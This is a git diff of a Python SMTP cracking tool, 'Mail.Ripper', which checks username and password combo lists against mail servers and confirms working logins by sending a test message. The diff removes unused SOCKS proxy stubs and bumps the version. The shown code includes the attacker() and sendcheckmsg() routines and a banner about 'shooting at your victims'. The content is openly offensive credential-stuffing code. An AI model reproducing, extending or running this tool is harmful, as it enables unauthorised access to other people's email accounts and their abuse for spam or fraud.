@@ -1,14 +1,13 @@
 #!/usr/local/bin/python3
 #encoding: utf-8
-#name: Mail.Ripper v1
+#name: Mail.Ripper v1 (proxyless)
 #description: smtp checker / smtp cracker including mailsending check for hits
-#version: 0.92, 2020-11-20
+#version: 1.00, 2020-11-20
 #author: DrPython3
-#TODO: Add support for SOCKS-proxies, improve code and performance ...
 #----------------------------------------------------------------------------------------------------------------------
 #((--> *P*A*C*K*A*G*E*S***N*E*E*D*E*D* <--))
 
-import ctypes, os, smtplib, socket, sys, ssl, threading, time, json, re, uuid, email.mime, socks, random
+import ctypes, os, smtplib, socket, sys, ssl, threading, time, json, re, uuid, email.mime
 from time import sleep
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -132,17 +131,10 @@ def blackcheck(search):
             return True
     except: pass
 
-#getproxdata == scrapes SOCKS4 proxies from Proxyscrape.com:
-#TODO: Write getproxdata() ... returns amount to variable "sockscount" ...
-
-#randomprox == gets random proxy data from scraped proxies:
-#TODO: Write randomprox() ...
-
 #finder == search for smtp hosts if not included in hosters dictionary:
 def finder(unkdom):
     socket.setdefaulttimeout(tout)
     defcontext = ssl.create_default_context()
-    #TODO: Include SOCKS for smtplib ...
     z = str('failed')
     print(Fore.LIGHTYELLOW_EX + 'Looking up SMTP-host for: ' + str(unkdom) + ' ...\n')
     try:
@@ -178,7 +170,6 @@ def finder(unkdom):
 def attacker(attackhost, attackport, attackuser, attackpass):
     socket.setdefaulttimeout(tout)
     defcontext = ssl.create_default_context()
-    #TODO: Include SOCKS for smtplib ... for hits, proxy data is provided to sendcheckmsg() ...
     try:
         #if SMTP port is unknown, try to find it using most common ones:
         if attackport == 0:
@@ -247,7 +238,6 @@ def sendcheckmsg(mailhost, mailport, mailuser, mailpass):
     else:
         socket.setdefaulttimeout(tout)
         msgcontext = ssl.create_default_context()
-        #TODO: Include SOCKS for smtplib with proxydata being provided by attacker() ...
         #generate randomID:
         randomid = uuid.uuid4().hex
         randomid = str(randomid[0:8])
@@ -488,9 +478,6 @@ if skip == 0:
 else:
     print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nCombos for GMAIL, etc. will be skipped and saved to a txt-file ...\n')
 
-#ask for proxy support:
-#TODO: Include user input for proxy support, variable "socksusage" ...
-
 #ask to start checking:
 startnow = input(Fore.LIGHTWHITE_EX + '*** DO YOU WANT TO START THE CHECKER NOW? *** (yes / no) :     ')
 if startnow == 'no':
@@ -503,7 +490,6 @@ else: pass
 
 #start checker:
 cleaner()
-#TODO: Add getproxdata() here if socksusage == 1 ...
 print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'YOUR GUN IS LOADED!\nLet us start shooting at your victims now ...\n\n')
 countdown()
 cleaner()
